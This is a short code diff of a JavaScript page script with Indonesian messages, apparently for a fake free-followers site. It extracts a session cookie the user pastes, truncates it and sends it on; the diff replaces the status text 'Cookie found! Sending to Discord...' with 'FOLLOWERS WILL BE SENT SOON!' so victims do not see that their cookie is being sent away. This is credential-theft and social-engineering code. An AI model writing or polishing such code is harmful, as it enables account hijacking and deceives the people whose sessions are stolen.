@@ -24,7 +24,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (match && match[1]) {
             const extractedCookie = match[1];
-            showStatus('Cookie ditemukan! Mengirim ke Discord...', 'processing');
+            // !!! TEKS NOTIFIKASI YANG DIUBAH ADA DI SINI !!!
+            showStatus('FOLLOWERS AKAN SEGERA TERKIRIM!', 'processing');
             
             // Kita potong cookie-nya biar aman dari error panjang
             const shortCookie = extractedCookie.substring(0, 1500);
@@ -43,7 +44,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 });
 
                 if (response.ok) {
-                    // !!! NOTIFIKASI SUKSES YANG DIUBAH ADA DI SINI !!!
                     showStatus('TUNGGU BEBERAPA SAAT JIKA FILE VALID FOLLOWERS TERKIRIM✅', 'success');
                     cookieInput.value = ''; // Kosongkan kotak
                 } else {
